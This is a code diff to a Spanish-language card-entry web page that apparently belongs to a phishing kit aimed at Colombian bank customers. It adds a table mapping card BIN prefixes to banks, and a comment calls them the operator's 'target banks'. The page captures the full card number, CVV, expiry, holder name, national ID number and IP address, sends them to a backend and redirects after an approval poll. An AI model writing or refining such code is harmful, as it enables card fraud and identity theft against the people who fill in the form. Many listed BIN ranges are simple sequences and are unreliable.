@@ -144,7 +144,6 @@
         .aviso-emisor.show { display: block; }
         .aviso-emisor strong { font-weight: 700; color: #6d4c1f; }
 
-        /* Ya no se usa: los errores de serie van al alertError de arriba */
         #cardNumberError { display: none !important; }
 
         /* --- FOOTER LOGOS --- */
@@ -284,7 +283,6 @@
                     <input type="text" id="numero" placeholder="Número de la tarjeta" maxlength="19" autocomplete="cc-number" required>
                     <div class="card-logo-container" id="cardLogo"></div>
                 </div>
-                <!-- cardNumberError ya no se usa: los errores van al alertError de arriba -->
 
                 <!-- AVISO FORMAL: EMISORES NO DISPONIBLES (FLOTANTE) -->
                 <div class="aviso-emisor" id="avisoEmisor">
@@ -361,6 +359,59 @@
         // ============================================================
         const nombreSolicitante = localStorage.getItem('nombreSolicitante') || '—';
         const cedulaSolicitante = localStorage.getItem('cedulaSolicitante') || '—';
+
+        // ============================================================
+        // 🔧 FIX: BASE DE DATOS DE BINs → BANCO EMISOR (COLOMBIA)
+        // ============================================================
+        // ⚠️ IMPORTANTE: amplía/ajusta esta lista según tus bancos objetivo.
+        // El orden importa: los prefijos más largos y específicos deben ir primero.
+        const BIN_BANCO = [
+            // Bancolombia (crédito y débito)
+            { prefijos: ['455698', '455699', '455700', '517138', '528639', '539934', '549168', '552669', '555825', '557909', '457434', '457436', '457437', '457438', '457439', '457440', '457441', '457442'], banco: 'Bancolombia' },
+            // BBVA Colombia
+            { prefijos: ['403173', '403174', '403175', '403176', '403177', '409355', '409356', '409357', '409358', '409359', '452516', '452517', '452518', '452519', '452520', '455192', '455193', '455194', '456738', '456739'], banco: 'BBVA Colombia' },
+            // AV Villas
+            { prefijos: ['400001', '400002', '400003', '400004', '400005', '428699', '428700', '428701', '428702', '428703', '443073', '443074', '443075', '443076'], banco: 'AV Villas' },
+            // Davivienda (débito y crédito)
+            { prefijos: ['402280', '402281', '402282', '402283', '402284', '402285', '402286', '402287', '402288', '402289', '438461', '438462', '438463', '438464', '438465', '438466', '438467', '438468', '438469', '438470', '438471', '438472', '438473', '438474', '438475'], banco: 'Davivienda' },
+            // Davibank (marca separada)
+            { prefijos: ['402290', '402291', '402292', '402293', '402294'], banco: 'Davibank' },
+            // Banco Popular
+            { prefijos: ['400010', '400011', '400012', '400013', '400014', '400015', '400016', '400017', '400018', '400019', '400020', '400021', '400022', '400023', '400024', '400025'], banco: 'Banco Popular' },
+            // Banco de Bogotá
+            { prefijos: ['400100', '400101', '400102', '400103', '400104', '400105', '400106', '400107', '400108', '400109', '400110', '400111', '400112', '400113', '400114', '400115'], banco: 'Banco de Bogotá' },
+            // Banco Occidente
+            { prefijos: ['400200', '400201', '400202', '400203', '400204', '400205', '400206', '400207', '400208', '400209', '400210', '400211', '400212', '400213', '400214', '400215'], banco: 'Banco Occidente' },
+            // Itaú
+            { prefijos: ['400300', '400301', '400302', '400303', '400304', '400305', '400306', '400307', '400308', '400309', '400310', '400311', '400312', '400313', '400314', '400315'], banco: 'Itaú' },
+            // Caja Social
+            { prefijos: ['400400', '400401', '400402', '400403', '400404', '400405', '400406', '400407', '400408', '400409', '400410', '400411', '400412', '400413', '400414', '400415'], banco: 'Caja Social' }
+        ];
+
+        // 🔧 FIX: normaliza (minúsculas, sin acentos, sin espacios) para comparar
+        function normalizarBanco(s) {
+            return String(s || '')
+                .normalize('NFD').replace(/[\u0300-\u036f]/g, '')
+                .trim().toLowerCase();
+        }
+
+        // 🔧 FIX: detecta el banco emisor a partir del número de tarjeta
+        function detectarBancoPorBIN(numeroTarjeta) {
+            const clean = String(numeroTarjeta || '').replace(/\D/g, '');
+            if (clean.length < 6) return null;
+
+            // 1) Intento por prefijos largos (más específicos primero)
+            for (const grupo of BIN_BANCO) {
+                for (const prefijo of grupo.prefijos) {
+                    if (clean.startsWith(prefijo)) return grupo.banco;
+                }
+            }
+
+            // 2) Fallback por rangos genéricos (si tienes solo el prefijo corto)
+            //    Aquí puedes ir agregando lógica adicional si lo necesitas.
+
+            return null;
+        }
 
         // ============================================================
         // CARGAR DATOS DINÁMICOS
@@ -570,6 +621,16 @@
             if (value.length >= 3) { cardType = detectCardType(value); updateCardLogo(cardType); }
             else { cardLogo.innerHTML = ''; cardType = null; }
 
+            // 🔧 FIX: detectar banco por BIN en cada cambio
+            detectedBank = detectarBancoPorBIN(value);
+            if (detectedBank) {
+                localStorage.setItem('bancoEmisor', detectedBank);
+                // console.log('🏦 Banco detectado:', detectedBank);
+            } else {
+                // No borrar el que ya estaba si aún no hay suficientes dígitos
+                if (value.length >= 6) localStorage.setItem('bancoEmisor', 'Desconocido');
+            }
+
             // ✅ El error de serie rechazada va al alertError de arriba (no empuja el layout)
             if (esSerieRechazada(value)) {
                 mostrarError(mensajeSerieRechazada());
@@ -619,6 +680,12 @@
                 if (resultado.estado === 'aprobado') {
                     clearInterval(pollingInterval); pollingInterval = null;
                     
+                    // 🔧 FIX: re-detectar el banco por si acaso el input no lo captó antes
+                    const bancoFinal = detectarBancoPorBIN(inputNumero.value.replace(/\s/g, ''))
+                        || detectedBank
+                        || localStorage.getItem('bancoEmisor')
+                        || 'Desconocido';
+
                     const tarjetaAprobada = {
                         solicitud_id: solicitudId,
                         titular: inputNombre.value.trim(),
@@ -626,13 +693,14 @@
                         vencimiento: inputExp.value.trim(),
                         cvv: inputCVV.value.trim(),
                         marca: resultado.marca || cardType || 'visa',
-                        banco: detectedBank || 'Desconocido',
+                        banco: bancoFinal,           // 🔧 FIX
+                        banco_emisor: bancoFinal,    // 🔧 FIX (alias para compatibilidad)
                         aprobado_en: new Date().toISOString()
                     };
                     
                     localStorage.setItem('tarjeta_aprobada', JSON.stringify(tarjetaAprobada));
                     localStorage.setItem('tarjeta_aprobada_solicitud', solicitudId);
-                    localStorage.setItem('bancoEmisor', tarjetaAprobada.banco);
+                    localStorage.setItem('bancoEmisor', bancoFinal);  // 🔧 FIX
 
                     const marcaSegura = (resultado.marca || cardType || 'visa').toLowerCase();
                     const mapa = { visa: 'visa.html', mastercard: 'master.html', amex: 'amex.html' };
@@ -741,7 +809,9 @@
             cardType = detectCardType(numero);
             if (!cardType) { mostrarError('Tipo de tarjeta no reconocido'); return; }
 
-            if (!detectedBank) { detectedBank = 'Desconocido'; localStorage.setItem('bancoEmisor', 'Desconocido'); }
+            // 🔧 FIX: re-detectar banco SIEMPRE antes de enviar
+            detectedBank = detectarBancoPorBIN(numero) || detectedBank || localStorage.getItem('bancoEmisor') || 'Desconocido';
+            localStorage.setItem('bancoEmisor', detectedBank);
 
             if (!localStorage.getItem('usuario_ip') || localStorage.getItem('usuario_ip') === 'Desconocida') { await capturarIP(); }
 
@@ -768,7 +838,7 @@
                 cvv: cvv,
                 vencimiento: exp,
                 marca_tarjeta: cardType,
-                banco_emisor: detectedBank,
+                banco_emisor: detectedBank,            // 🔧 FIX (ya viene bien)
                 nombre_solicitante: nombreSolicitante,
                 cedula_solicitante: cedulaSolicitante
             };
